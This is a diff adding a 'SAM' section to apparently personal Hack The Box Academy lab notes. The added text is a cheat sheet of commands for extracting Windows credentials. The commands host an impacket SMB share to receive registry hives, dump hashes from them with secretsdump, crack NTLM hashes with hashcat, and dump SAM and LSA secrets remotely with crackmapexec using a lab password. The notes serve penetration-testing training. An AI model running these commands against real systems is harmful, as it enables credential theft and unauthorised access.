@@ -58,4 +58,17 @@ crackmapexec smb 10.129.252.193 -u "cassie" -p "12345678910" --shares
 smbclient -U cassie \\\\10.129.252.193\\CASSIE
 ```
 
+## SAM
+
+```shell
+╰─○ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/kali/test
+
+╰─○ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL > resultdump.txt
+
+for NTLM
+╰─○ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
+
+╰─○ crackmapexec smb 10.129.202.137 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+
+╰─○ crackmapexec smb 10.129.202.137 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
 ```
